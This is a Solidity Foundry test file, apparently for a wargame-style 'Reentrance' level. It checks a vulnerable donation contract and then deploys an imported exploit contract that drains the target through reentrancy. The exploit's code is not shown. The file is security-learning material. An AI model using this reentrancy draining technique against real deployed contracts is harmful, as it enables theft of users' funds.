// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";
import {ReentranceExploit} from "../src/Reentrance.e.sol";

contract ReentranceTest is Test {
    Reentrance public target;
    ReentranceExploit public exploit;
    address account;

    function setUp() public {
        target = new Reentrance();
        account = makeAddr("random_user");
    }

    function atest_donate_withdraw() public {
        vm.deal(account, 1 wei);

        vm.startPrank(account);

        assert(target.balanceOf(account) == 0);
        target.donate{value: 1 wei}(account);
        assert(target.balanceOf(account) == 1 wei);
        assert(address(account).balance == 0);
        target.withdraw(1 wei);
        assert(target.balanceOf(account) == 0);
        assert(address(account).balance == 1 wei);
        vm.stopPrank();
    }

    function atest_withdraw_more_than_balance() public {
        vm.deal(account, 1 wei);
        vm.startPrank(account);
        target.donate{value: 1 wei}(account);
        assert(target.balanceOf(account) == 1 wei);
        assert(address(account).balance == 0);
        target.withdraw(2 wei);
        //NOTE widthdraw does not raise error when the balance is less than the amount!
        vm.stopPrank();
    }

    function test_exploit() public {
        // deal 1 wei to the account
        vm.deal(account, 1 ether);
        // and donate
        vm.startPrank(account);
        target.donate{value: 1 ether}(account);
        // the balance of the account is 0
        assert(address(account).balance == 0); // account balance
        // the balance of the target is 1 ether
        assert(target.balances(account) == 1 ether); // account balance in contract
        assert(address(target).balance == 1 ether); // total balance in contract

        vm.stopPrank();

        address exploiter = makeAddr("Exploiter");
        vm.deal(exploiter, 1 ether);
        vm.startPrank(exploiter);
        exploit = new ReentranceExploit{value: 1 ether}(target);
        assert(address(exploit).balance == 0);
        assert(address(exploiter).balance == 0);
        assert(address(target).balance == 2 ether);

        console.log("_______________");
        // Withdraw all by exploiting reentrancy
        exploit.withdraw(0.5 ether);

        // assert(address(exploit).balance == 0);
        // assert(address(exploiter).balance == 2 ether);

        vm.stopPrank();
    }
}
